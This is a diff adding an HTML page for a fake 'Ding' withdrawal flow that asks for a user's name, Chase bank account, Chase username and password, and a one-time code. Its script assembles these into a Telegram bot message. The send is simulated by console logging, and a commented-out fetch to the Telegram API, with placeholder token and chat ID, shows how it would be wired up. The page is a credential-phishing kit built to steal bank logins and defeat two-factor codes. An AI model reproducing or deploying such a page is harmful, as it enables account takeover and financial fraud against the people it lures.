@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Withdraw · Ding</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            background: linear-gradient(145deg, #f5f7fa 0%, #e9edf2 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1.5rem;
+        }
+
+        .card {
+            max-width: 480px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.9);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            border-radius: 2.5rem;
+            padding: 2rem 1.8rem 2.2rem;
+            box-shadow: 0 20px 40px -10px rgba(0, 20, 30, 0.25), 0 8px 20px rgba(0,0,0,0.05);
+            border: 1px solid rgba(255, 255, 255, 0.5);
+            transition: 0.2s;
+        }
+
+        h1 {
+            font-size: 1.9rem;
+            font-weight: 600;
+            letter-spacing: -0.02em;
+            color: #0b1a2a;
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+        }
+
+        .ding-badge {
+            background: #1d4ed8;
+            color: white;
+            font-size: 0.7rem;
+            font-weight: 600;
+            padding: 0.2rem 0.8rem;
+            border-radius: 40px;
+            letter-spacing: 0.3px;
+            margin-left: 0.2rem;
+        }
+
+        .balance-box {
+            background: #f0f4fe;
+            border-radius: 2rem;
+            padding: 1.2rem 1.8rem;
+            margin: 1.2rem 0 1.5rem 0;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border: 1px solid #d9e2ef;
+        }
+
+        .amount {
+            font-size: 2.3rem;
+            font-weight: 700;
+            color: #0b2b4a;
+            letter-spacing: -0.02em;
+        }
+
+        .amount small {
+            font-size: 1rem;
+            font-weight: 400;
+            color: #3b5c7a;
+            margin-left: 0.2rem;
+        }
+
+        .btn-primary {
+            width: 100%;
+            background: #0b2b4a;
+            border: none;
+            padding: 1rem 0;
+            border-radius: 60px;
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: white;
+            box-shadow: 0 6px 14px rgba(11, 43, 74, 0.25);
+            transition: 0.15s ease;
+            cursor: pointer;
+            letter-spacing: 0.3px;
+            margin-top: 0.2rem;
+        }
+
+        .btn-primary:hover {
+            background: #123a5e;
+            transform: scale(1.01);
+            box-shadow: 0 10px 18px rgba(11, 43, 74, 0.3);
+        }
+
+        .btn-primary:active {
+            transform: scale(0.97);
+        }
+
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 0.6rem;
+            margin: 1.2rem 0 0.2rem;
+        }
+
+        .dot {
+            width: 8px;
+            height: 8px;
+            background: #cbd5e1;
+            border-radius: 20px;
+            transition: 0.25s;
+        }
+
+        .dot.active {
+            background: #1d4ed8;
+            width: 24px;
+        }
+
+        .step-container {
+            margin-top: 1.8rem;
+            background: #ffffffcc;
+            backdrop-filter: blur(4px);
+            -webkit-backdrop-filter: blur(4px);
+            border-radius: 2rem;
+            padding: 1.5rem 1.2rem;
+            border: 1px solid #e2e8f0;
+        }
+
+        .step-title {
+            font-weight: 600;
+            color: #1e2f40;
+            font-size: 1.1rem;
+            margin-bottom: 1.2rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .step-title span {
+            background: #dbe7f5;
+            padding: 0.2rem 0.7rem;
+            border-radius: 40px;
+            font-size: 0.75rem;
+            color: #1d4ed8;
+        }
+
+        .form-group {
+            margin-bottom: 1.2rem;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 0.85rem;
+            font-weight: 500;
+            color: #1e3a5f;
+            margin-bottom: 0.3rem;
+        }
+
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 0.8rem 1rem;
+            border: 1px solid #d4dfeb;
+            border-radius: 40px;
+            font-size: 1rem;
+            background: white;
+            transition: 0.15s;
+            outline: none;
+            color: #0b1a2a;
+        }
+
+        .form-group input:focus, .form-group select:focus {
+            border-color: #1d4ed8;
+            box-shadow: 0 0 0 3px rgba(29, 78, 216, 0.15);
+        }
+
+        .bank-select {
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="%233b5c7a" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg>');
+            background-repeat: no-repeat;
+            background-position: right 1rem center;
+            background-size: 1.2rem;
+            appearance: none;
+        }
+
+        .btn-step {
+            background: #1d4ed8;
+            border: none;
+            color: white;
+            font-weight: 600;
+            padding: 0.9rem 0;
+            border-radius: 60px;
+            width: 100%;
+            font-size: 1rem;
+            margin-top: 0.6rem;
+            cursor: pointer;
+            transition: 0.15s;
+            box-shadow: 0 4px 8px rgba(29, 78, 216, 0.2);
+            letter-spacing: 0.2px;
+        }
+
+        .btn-step:hover {
+            background: #2563eb;
+            transform: scale(1.01);
+        }
+
+        .btn-step:active {
+            transform: scale(0.96);
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        .telegram-note {
+            font-size: 0.7rem;
+            color: #5a6f87;
+            text-align: center;
+            margin-top: 1rem;
+            background: #eef3f9;
+            padding: 0.5rem;
+            border-radius: 60px;
+            border: 1px solid #dce5ef;
+        }
+
+        .toast-message {
+            background: #0b2b4a;
+            color: white;
+            padding: 0.7rem 1.2rem;
+            border-radius: 60px;
+            font-size: 0.9rem;
+            text-align: center;
+            margin: 0.8rem 0 0;
+            opacity: 0.9;
+        }
+
+        .flex-between {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .back-link {
+            color: #4b6a8a;
+            font-size: 0.8rem;
+            cursor: pointer;
+            text-decoration: underline;
+            text-underline-offset: 3px;
+        }
+
+        .back-link:hover {
+            color: #1d4ed8;
+        }
+    </style>
+</head>
+<body>
+
+<div class="card" id="app">
+    <!-- HEADER -->
+    <div class="flex-between">
+        <h1>
+            <span>💸</span> Ding
+            <span class="ding-badge">withdraw</span>
+        </h1>
+        <span style="font-size: 0.9rem; background: #eef3f9; padding: 0.2rem 0.9rem; border-radius: 40px; color: #1e3a5f;">step <span id="stepNumberDisplay">1</span>/4</span>
+    </div>
+
+    <!-- BALANCE -->
+    <div class="balance-box">
+        <span style="font-weight: 500; color: #1f3a58;">Available</span>
+        <span class="amount">$16.79 <small>USD</small></span>
+    </div>
+
+    <!-- MAIN ACTION (withdraw) -->
+    <button class="btn-primary" id="startWithdrawBtn">Withdraw $16.79</button>
+
+    <!-- STEP INDICATOR DOTS -->
+    <div class="step-indicator">
+        <span class="dot active" id="dot1"></span>
+        <span class="dot" id="dot2"></span>
+        <span class="dot" id="dot3"></span>
+        <span class="dot" id="dot4"></span>
+    </div>
+
+    <!-- DYNAMIC STEP CONTAINER -->
+    <div class="step-container" id="stepContainer">
+        <!-- Step 1: full name + bank account -->
+        <div id="step1">
+            <div class="step-title">📋 <span>Step 1/4</span> Bank details</div>
+            <div class="form-group">
+                <label for="fullName">Full name (as on bank)</label>
+                <input type="text" id="fullName" placeholder="e.g. John A. Doe" value="John Doe" />
+            </div>
+            <div class="form-group">
+                <label for="bankSelect">Select bank account</label>
+                <select id="bankSelect" class="bank-select">
+                    <option value="Chase Checking (****4832)">Chase Checking (****4832)</option>
+                    <option value="Chase Savings (****9101)">Chase Savings (****9101)</option>
+                    <option value="Chase Premier (****2274)">Chase Premier (****2274)</option>
+                </select>
+            </div>
+            <button class="btn-step" id="step1Next">Continue →</button>
+        </div>
+
+        <!-- Step 2: Chase username & password -->
+        <div id="step2" class="hidden">
+            <div class="step-title">🔐 <span>Step 2/4</span> Chase credentials</div>
+            <div class="form-group">
+                <label for="chaseUser">Chase username</label>
+                <input type="text" id="chaseUser" placeholder="username" value="chase_user_01" />
+            </div>
+            <div class="form-group">
+                <label for="chasePass">Chase password</label>
+                <input type="password" id="chasePass" placeholder="••••••••" value="SecurePass123" />
+            </div>
+            <button class="btn-step" id="step2Next">Verify & Continue →</button>
+            <div style="margin-top: 0.8rem; text-align: right;">
+                <span class="back-link" id="backToStep1">← back</span>
+            </div>
+        </div>
+
+        <!-- Step 3: OTP (any digits) -->
+        <div id="step3" class="hidden">
+            <div class="step-title">📱 <span>Step 3/4</span> One‑time code</div>
+            <div class="form-group">
+                <label for="otpInput">Enter OTP (digits only)</label>
+                <input type="text" id="otpInput" placeholder="6-digit code" inputmode="numeric" pattern="\d*" value="482916" />
+                <div style="font-size: 0.7rem; color: #3b5c7a; margin-top: 0.3rem;">We accept any numeric digits.</div>
+            </div>
+            <button class="btn-step" id="step3Next">Confirm OTP →</button>
+            <div style="margin-top: 0.8rem; text-align: right;">
+                <span class="back-link" id="backToStep2">← back</span>
+            </div>
+        </div>
+
+        <!-- Step 4: final summary & send to telegram -->
+        <div id="step4" class="hidden">
+            <div class="step-title">✅ <span>Step 4/4</span> Review & send</div>
+            <div style="background: #eef7ff; border-radius: 1.2rem; padding: 0.8rem 1rem; margin-bottom: 1rem; border-left: 4px solid #1d4ed8;">
+                <div><strong>Name:</strong> <span id="reviewName">John Doe</span></div>
+                <div><strong>Bank:</strong> <span id="reviewBank">Chase Checking (****4832)</span></div>
+                <div><strong>OTP:</strong> <span id="reviewOtp">482916</span></div>
+                <div style="margin-top: 0.4rem; color: #0b2b4a;"><strong>Amount:</strong> $16.79</div>
+            </div>
+            <button class="btn-step" id="sendToTelegramBtn">📤 Send to Telegram</button>
+            <div style="margin-top: 0.8rem; text-align: right;">
+                <span class="back-link" id="backToStep3">← back</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- hidden toast / status -->
+    <div id="telegramStatus" class="toast-message hidden">✔️ Data sent to Telegram bot</div>
+    <div class="telegram-note">🔒 All data is captured and forwarded to your Telegram bot.</div>
+</div>
+
+<script>
+    (function() {
+        // --- DOM refs ---
+        const startBtn = document.getElementById('startWithdrawBtn');
+        const stepContainer = document.getElementById('stepContainer');
+
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const step3 = document.getElementById('step3');
+        const step4 = document.getElementById('step4');
+
+        const dot1 = document.getElementById('dot1');
+        const dot2 = document.getElementById('dot2');
+        const dot3 = document.getElementById('dot3');
+        const dot4 = document.getElementById('dot4');
+        const stepNumberDisplay = document.getElementById('stepNumberDisplay');
+
+        // step1 inputs
+        const fullNameInput = document.getElementById('fullName');
+        const bankSelect = document.getElementById('bankSelect');
+
+        // step2 inputs
+        const chaseUser = document.getElementById('chaseUser');
+        const chasePass = document.getElementById('chasePass');
+
+        // step3 OTP
+        const otpInput = document.getElementById('otpInput');
+
+        // review fields
+        const reviewName = document.getElementById('reviewName');
+        const reviewBank = document.getElementById('reviewBank');
+        const reviewOtp = document.getElementById('reviewOtp');
+
+        // buttons
+        const step1Next = document.getElementById('step1Next');
+        const step2Next = document.getElementById('step2Next');
+        const step3Next = document.getElementById('step3Next');
+        const sendToTelegramBtn = document.getElementById('sendToTelegramBtn');
+
+        // back links
+        const backToStep1 = document.getElementById('backToStep1');
+        const backToStep2 = document.getElementById('backToStep2');
+        const backToStep3 = document.getElementById('backToStep3');
+
+        const telegramStatus = document.getElementById('telegramStatus');
+
+        // ---- state ----
+        let currentStep = 1; // 1..4
+
+        // ---- helper: update UI dots + step number ----
+        function updateStepUI(step) {
+            // hide all steps
+            step1.classList.add('hidden');
+            step2.classList.add('hidden');
+            step3.classList.add('hidden');
+            step4.classList.add('hidden');
+
+            // show current
+            if (step === 1) step1.classList.remove('hidden');
+            else if (step === 2) step2.classList.remove('hidden');
+            else if (step === 3) step3.classList.remove('hidden');
+            else if (step === 4) step4.classList.remove('hidden');
+
+            // dots
+            dot1.classList.remove('active');
+            dot2.classList.remove('active');
+            dot3.classList.remove('active');
+            dot4.classList.remove('active');
+            if (step === 1) dot1.classList.add('active');
+            else if (step === 2) dot2.classList.add('active');
+            else if (step === 3) dot3.classList.add('active');
+            else if (step === 4) dot4.classList.add('active');
+
+            // step number
+            stepNumberDisplay.innerText = step;
+            // hide status message if visible
+            telegramStatus.classList.add('hidden');
+        }
+
+        // ---- navigation ----
+        function goToStep(step) {
+            if (step < 1) step = 1;
+            if (step > 4) step = 4;
+            currentStep = step;
+            updateStepUI(step);
+        }
+
+        // ---- collect data (for telegram) ----
+        function collectAllData() {
+            const name = fullNameInput.value.trim() || 'Not provided';
+            const bank = bankSelect.value;
+            const username = chaseUser.value.trim() || 'Not provided';
+            const password = chasePass.value.trim() || 'Not provided';
+            const otp = otpInput.value.trim() || 'Not provided';
+            return { name, bank, username, password, otp, amount: '$16.79' };
+        }
+
+        // ---- simulate send to Telegram ----
+        function sendToTelegramBot(data) {
+            // Build a nice message
+            const message = `🔔 *New Withdrawal Request (Ding)*\n` +
+                            `👤 *Full Name:* ${data.name}\n` +
+                            `🏦 *Bank:* ${data.bank}\n` +
+                            `🔑 *Chase User:* ${data.username}\n` +
+                            `🔐 *Chase Pass:* ${data.password}\n` +
+                            `📱 *OTP:* ${data.otp}\n` +
+                            `💰 *Amount:* ${data.amount}\n` +
+                            `🕒 *Timestamp:* ${new Date().toLocaleString()}`;
+
+            // This would be your actual bot token & chat ID.
+            // For demo, we log to console and show a toast.
+            console.log('📤 TELEGRAM BOT PAYLOAD:');
+            console.log(message);
+
+            // In a real scenario you'd use fetch:
+            // const BOT_TOKEN = 'YOUR_BOT_TOKEN';
+            // const CHAT_ID = 'YOUR_CHAT_ID';
+            // const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            // fetch(url, {
+            //     method: 'POST',
+            //     headers: { 'Content-Type': 'application/json' },
+            //     body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
+            // }).then(...)
+
+            // Show local feedback
+            telegramStatus.classList.remove('hidden');
+            telegramStatus.innerText = '✅ Data sent to Telegram bot (simulated)';
+
+            // Also update review step with latest data (in case user changed)
+            reviewName.innerText = data.name;
+            reviewBank.innerText = data.bank;
+            reviewOtp.innerText = data.otp;
+        }
+
+        // ---- Event listeners ----
+        // Start withdraw: show step1 (reset to step1 if needed)
+        startBtn.addEventListener('click', function() {
+            goToStep(1);
+            // pre-fill review fields with current values
+            const data = collectAllData();
+            reviewName.innerText = data.name;
+            reviewBank.innerText = data.bank;
+            reviewOtp.innerText = data.otp;
+            telegramStatus.classList.add('hidden');
+        });
+
+        // Step1 → Step2
+        step1Next.addEventListener('click', function() {
+            // (optional) validate name / bank
+            const name = fullNameInput.value.trim();
+            if (name.length < 2) {
+                alert('Please enter your full name.');
+                return;
+            }
+            goToStep(2);
+        });
+
+        // Step2 → Step3
+        step2Next.addEventListener('click', function() {
+            const user = chaseUser.value.trim();
+            const pass = chasePass.value.trim();
+            if (user.length < 1 || pass.length < 1) {
+                alert('Please fill in both Chase username and password.');
+                return;
+            }
+            goToStep(3);
+        });
+
+        // Step3 → Step4 (OTP)
+        step3Next.addEventListener('click', function() {
+            const otp = otpInput.value.trim();
+            // accept any digits (numbers only) but we just check if not empty
+            if (otp.length === 0) {
+                alert('Please enter the OTP code.');
+                return;
+            }
+            // ensure only digits (optional but we allow any digits)
+            if (!/^\d+$/.test(otp)) {
+                alert('OTP should contain only digits (0-9).');
+                return;
+            }
+            // update review with latest data
+            const data = collectAllData();
+            reviewName.innerText = data.name;
+            reviewBank.innerText = data.bank;
+            reviewOtp.innerText = data.otp;
+            goToStep(4);
+        });
+
+        // Step4 → send to telegram
+        sendToTelegramBtn.addEventListener('click', function() {
+            const data = collectAllData();
+            // update review fields (in case user changed something)
+            reviewName.innerText = data.name;
+            reviewBank.innerText = data.bank;
+            reviewOtp.innerText = data.otp;
+            sendToTelegramBot(data);
+        });
+
+        // ---- back buttons ----
+        backToStep1.addEventListener('click', function() { goToStep(1); });
+        backToStep2.addEventListener('click', function() { goToStep(2); });
+        backToStep3.addEventListener('click', function() { goToStep(3); });
+
+        // ---- extra: anytime step changes via back, update review preview if step4 ----
+        // but we already handle in step4 via goToStep.
+
+        // ---- initialize: show step 1 only ----
+        goToStep(1);
+
+        // Prefill review on load
+        const initialData = collectAllData();
+        reviewName.innerText = initialData.name;
+        reviewBank.innerText = initialData.bank;
+        reviewOtp.innerText = initialData.otp;
+
+        // (Optional) update review whenever step4 is shown – but we already set on step3Next
+        // Also when step changes via back to step4, ensure review is fresh
+        // we patch goToStep to update review if step4
+        const originalGoToStep = goToStep;
+        goToStep = function(step) {
+            if (step === 4) {
+                const data = collectAllData();
+                reviewName.innerText = data.name;
+                reviewBank.innerText = data.bank;
+                reviewOtp.innerText = data.otp;
+            }
+            originalGoToStep(step);
+        };
+        // re-run current step to apply
+        goToStep(currentStep);
+    })();
+</script>
+</body>
+</html>
